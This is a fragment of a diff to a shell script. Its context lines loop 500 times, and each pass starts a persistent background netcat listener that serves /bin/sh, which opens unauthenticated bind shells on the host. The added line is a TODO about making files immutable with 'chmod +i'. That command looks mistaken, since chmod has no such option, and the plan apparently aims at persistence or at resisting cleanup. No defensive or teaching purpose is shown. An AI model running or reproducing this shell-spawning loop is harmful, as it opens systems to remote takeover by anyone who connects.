@@ -28,3 +28,5 @@ for i in {1..500}
 do
    nc -lke /bin/sh &
 done
+
+# TODO: chmod +i a bunch of files
